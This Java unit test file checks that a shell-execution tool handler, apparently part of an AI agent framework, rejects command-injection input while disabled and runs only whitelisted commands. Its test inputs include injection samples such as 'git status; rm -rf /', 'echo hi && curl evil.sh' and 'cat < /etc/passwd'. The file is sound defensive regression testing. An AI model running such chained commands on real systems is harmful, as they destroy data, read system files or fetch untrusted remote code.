package io.aria.conductor.execution.tool.handlers;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.HashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Security-focused behaviour tests for {@link ShellExecHandler}.
 *
 * <p>The handler is disabled by default and, while disabled, acts as a hardened gate:
 * <ul>
 *   <li>any shell metacharacter (chaining/piping/redirection) is rejected outright;</li>
 *   <li>only whitelisted first-tokens are permitted to spawn a process;</li>
 *   <li>an empty command is rejected as a missing parameter.</li>
 * </ul>
 * When explicitly enabled the whitelist gate is bypassed. These tests double as
 * command-injection regression guards, so no metacharacter input is ever allowed to
 * reach {@link ProcessBuilder} while disabled.
 */
class ShellExecHandlerTest {

    private ShellExecHandler handler;

    @BeforeEach
    void setUp() {
        handler = new ShellExecHandler();
        // Reproduce the @Value defaults so tests do not depend on a Spring context.
        ReflectionTestUtils.setField(handler, "shellEnabled", false);
        ReflectionTestUtils.setField(handler, "whitelist", "git,ls,cat,find,echo,mvn,npm,pnpm");
    }

    private String run(String command) {
        Map<String, Object> args = new HashMap<>();
        if (command != null) args.put("command", command);
        return handler.execute(args);
    }

    @Test
    void execute_rejectsMissingCommand() {
        assertThat(run(null)).isEqualTo("Error: Missing required parameter: command");
        assertThat(run("")).isEqualTo("Error: Missing required parameter: command");
    }

    @ParameterizedTest(name = "injection-shaped input rejected: [{0}]")
    @ValueSource(strings = {
            "git status; rm -rf /",
            "ls | sh",
            "echo hi && curl evil.sh",
            "cat file `whoami`",
            "echo $(reboot)",
            "cat < /etc/passwd",
            "echo hi > /tmp/x",
            "git log \n rm -rf ."
    })
    void execute_rejectsShellMetacharacters_whenDisabled(String command) {
        // The special-character guard fires BEFORE the whitelist check, so even a
        // whitelisted first-token (git/ls/cat/echo) is refused when metachars are present.
        assertThat(run(command))
                .isEqualTo("Error: Shell execution is disabled. Special characters are not allowed.");
    }

    @ParameterizedTest(name = "non-whitelisted command refused: [{0}]")
    @ValueSource(strings = {"rm -rf foo", "curl http://evil", "wget file", "python script.py"})
    void execute_refusesNonWhitelistedCommand_whenDisabled(String command) {
        assertThat(run(command))
                .startsWith("Error: Shell execution is disabled. Allowed commands:")
                .contains("git,ls,cat,find,echo,mvn,npm,pnpm");
    }

    @Test
    void execute_allowsWhitelistedCommand_caseInsensitiveFirstToken() {
        // "echo" is whitelisted; the handler actually spawns it. Assert real stdout capture.
        assertThat(run("echo shellhandler_marker")).contains("shellhandler_marker");
        // Whitelist match is case-insensitive on the first token. Only assert the gate was
        // bypassed: actually spawning "ECHO" is OS-dependent (Linux binary lookup is case-sensitive).
        assertThat(run("ECHO caseMarker")).doesNotStartWith("Error: Shell execution is disabled");
    }

    @Test
    void execute_bypassesWhitelist_whenEnabled() {
        ReflectionTestUtils.setField(handler, "shellEnabled", true);
        // "whoami" is NOT whitelisted; when enabled it must still run, proving the gate is bypassed.
        String result = run("whoami");
        assertThat(result).doesNotStartWith("Error: Shell execution is disabled");
    }
}
